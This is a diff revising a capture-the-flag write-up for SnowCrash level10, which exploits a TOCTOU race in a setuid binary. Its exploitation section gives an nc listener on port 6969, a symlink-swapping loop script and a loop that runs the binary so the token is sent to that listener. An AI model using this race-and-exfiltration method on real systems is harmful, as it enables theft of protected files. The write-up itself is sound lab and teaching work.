@@ -2,27 +2,26 @@
 
 ## Analysis
 
-Once again let's check what we have in out directory:
+## Enumerating
+
+Once again enumerating the home directory displays two files, `level10` and `token`:
 ```bash
     level10@SnowCrash:~$ ls -la
-    total 28
-    dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 .
-    d--x--x--x  1 root    users     340 Aug 30  2015 ..
-    -r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout
-    -r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc
+    [...]
     -rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-    -r-x------  1 level10 level10   675 Apr  3  2012 .profile
     -rw-------  1 flag10  flag10     26 Mar  5  2016 token
 ```
 
-This is what we get when we try to run the program with the token:
+Except this time, the binary can run with the token but does not give any conclusive hints on the vulnerability to expoit:
 ```bash
     level10@SnowCrash:~$ ./level10 token
     ./level10 file host
             sends file to host if you have access to it
 ```
 
-There let's use the command strings to check what's inside level10:
+## Investigation
+
+We use `strings` to look for intersting printable strings that program:
 ```bash
     level10@SnowCrash:~$ strings level10
     [...]
@@ -38,27 +37,29 @@ There let's use the command strings to check what's inside level10:
     [...]
 ```
 
-You can see two things.
-1. The program tries to open a file and checks with access if 
-you have the rights to open the file. This is a security hole we can exploit 
-because of the short time interval between checking and opening the file to 
-manipulate it. What we call RACE CONDITION EXPLOIT.
-https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use
+Now two relevant hints appear:
 
+1. The program tries to open a file and control access rights with `access`.
 2. The program is trying to send a file, connecting to 6969.
 
-## Solution
-So we will next use netcat in one vm window:
+## Vulnerability
+
+The vulnerability present in this program is called `TOCTOU (Time-of-Check to Time-of-Use) race condition exploit`. This creates a time window where the file can be modified between the check and the actual use.
+The goal is to exploit the race window between `access()` and `open()`.
+
+## Exploitation
+
+N.B: The two scripts used in this eploitation can be found in the ressource directory. All scripts must run locally in /tmp where we have write access. Do not forget to change permission before running both scripts.
+
+To put in place this exploitation, we need to open three terminals.
+
+In the first terminal we run netcat to listen to the port the program tries to connect to:
 ```bash
     level10@SnowCrash:~$ nc -lk 6969
     # -l to specify netcat should listen on specified port, -k to stay listening after each connection.
 ```
 
-In a second window create a script in /tmp to create of a file, delete it, then create a symbolic 
-link to exploit the short time between these two operations. Basically, we hope that access will think that we want to open it.
-Then we delete it before we create a symbolic link so that open open the token file ! Then we remove our symbolic link before create 
-again because of the infinity loop.
-In /tmp/script.sh:
+In a second window we launch our first script `script.sh` in /tmp. this script continuously attempts to win the race window.
 ```bash
 #!/bin/bash
 while true; do
@@ -69,8 +70,7 @@ while true; do
 done
 ```
 
-Then in a /tmp/spam.sh (i another vm window) we will try to open the file linked to the token 
-(in a infinity loop again):
+The third script `spam.sh` is launched in a third terminal. This script will just keep trying to run the binary with the symlink and ip address as argument:
 ```bash
     #!/bin/bash
     while true; do
@@ -78,14 +78,10 @@ Then in a /tmp/spam.sh (i another vm window) we will try to open the file linked
     done
 ```
 
-Then change both permission (the only way is to do chmod +x /tmp/file) then run both files and we get
-the following:
+## Result 
+
 ```bash
     level10@SnowCrash:~$ nc -lk 6969
-    .*( )*.
-    .*( )*.
-    .*( )*.
-    .*( )*.
     .*( )*.
     [...]
     .*( )*.
@@ -93,8 +89,6 @@ the following:
     .*( )*.
     [...]
 ```
-
-And this is out file!
 ```bash
     level10@SnowCrash:~$ su flag10
     Password: 
@@ -103,3 +97,6 @@ And this is out file!
     Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXXXXX
 ```
 
+## Takeaways
+
+- authorization check and resource usage must be atomic
